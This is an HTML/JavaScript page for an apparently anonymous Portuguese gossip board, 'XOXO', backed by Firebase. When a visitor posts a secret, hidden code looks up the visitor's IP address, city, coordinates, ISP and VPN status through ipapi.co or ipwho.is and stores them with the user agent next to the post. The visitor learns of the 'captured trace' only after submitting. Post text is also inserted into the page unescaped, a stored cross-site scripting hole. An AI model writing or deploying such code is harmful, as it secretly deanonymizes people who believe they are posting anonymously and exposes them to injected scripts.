<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - O Mural dos Segredos</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        body { 
            margin: 0; 
            background-color: var(--deep-black); 
            color: #ddd; 
            font-family: 'Courier New', monospace; 
        }
        .hero { 
            height: 40vh; 
            background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); 
            background-size: cover; 
            background-position: center; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            text-align: center;
        }
        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
        
        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
        .btn-login { 
            background: #333; 
            color: white; 
            padding: 15px 30px; 
            cursor: pointer; 
            border: 1px solid #555; 
            text-transform: uppercase; 
        }

        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
        .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
        textarea { 
            width: 100%; 
            background: transparent; 
            border: none; 
            color: #aaa; 
            font-size: 1.1rem; 
            outline: none; 
            font-family: inherit; 
            resize: none;
        }
        .btn-post { 
            background: #222; 
            color: #999; 
            border: 1px solid #444; 
            padding: 10px 20px; 
            float: right; 
            cursor: pointer; 
        }
        .fofoca-card { 
            background: #0d0d0d; 
            padding: 20px; 
            margin-bottom: 15px; 
            border-left: 3px solid #444; 
        }
    </style>
</head>
<body>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o sil√™ncio guarda.</p>
    </header>

    <div id="login-screen">
        <h3>Entre no mural... se tiver coragem.</h3>
        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="O que voc√™ sabe que ningu√©m mais sabe?"></textarea>
            <button class="btn-post" onclick="enviarFofoca()">Soltar o Verbo!</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        // 1. Configura√ß√£o do seu Firebase (Mantida a sua original)
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };

        // 2. Inicializa√ß√£o
        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function fakeLogin() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        // 3. Fun√ß√£o de Rastreio com Dupla Verifica√ß√£o (Ajustada para o seu erro)
        function enviarFofoca() {
            var inputElement = document.getElementById('fofocaInput');
            var texto = inputElement.value;
            if(texto.trim() === "") return;

            // Tentativa 1: ipapi.co (√ìtimo para dados de Wi-Fi/Org)
            fetch('https://ipapi.co/json/')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    processarEnvio(data, texto, inputElement, "ipapi");
                })
                .catch(function() {
                    // Tentativa 2: ipwho.is (Backup caso a primeira falhe)
                    fetch('https://ipwho.is/')
                        .then(function(res) { return res.json(); })
                        .then(function(data) {
                            processarEnvio(data, texto, inputElement, "ipwho");
                        })
                        .catch(function() {
                            // Se todos os rastreios falharem por bloqueio do navegador
                            processarEnvio(null, texto, inputElement, "bloqueado");
                        });
                });
        }

        function processarEnvio(data, texto, inputElement, fonte) {
            var rastro = {};
            
            if (data) {
                // Monta os dados com aspas simples para evitar erros de sintaxe no seu editor
                rastro = {
                    ip: data.ip || data.query || "Desconhecido",
                    localizacao: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country_name || data.country || "?"),
                    provedor_wifi: data.org || (data.connection ? data.connection.isp : "N√£o detectado"),
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    fonte: fonte,
                    e_vpn: data.security ? data.security.vpn : (data.is_vpn || false)
                };
            } else {
                rastro = { status: "Rastreio bloqueado pelo navegador ou VPN" };
            }

            // Envio para o Cloud Firestore
            db.collection("fofocas").add({
                conteudo: texto,
                data: firebase.firestore.FieldValue.serverTimestamp(),
                rastro: rastro,
                dispositivo: navigator.userAgent
            })
            .then(function() {
                inputElement.value = "";
                alert("Segredo enviado com sucesso! Rastro capturado.");
            })
            .catch(function(error) {
                console.error("Erro no Firebase:", error);
                alert("Erro ao enviar! Verifique se o seu Firebase est√° em 'Modo de Teste'.");
            });
        }

        function carregarFofocas() {
            // Carrega em tempo real e ordena pela data
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(function(snapshot) {
                var mural = document.getElementById('mural');
                mural.innerHTML = "";
                snapshot.forEach(function(doc) {
                    var f = doc.data();
                    mural.innerHTML += '<div class="fofoca-card">' +
                        '<small style="color: #444;">üì¢ Um segredo sussurrado...</small>' +
                        '<p style="color: #999;">' + (f.conteudo || "") + '</p>' +
                    '</div>';
                });
            });
        }
    </script>
</body>
</html>
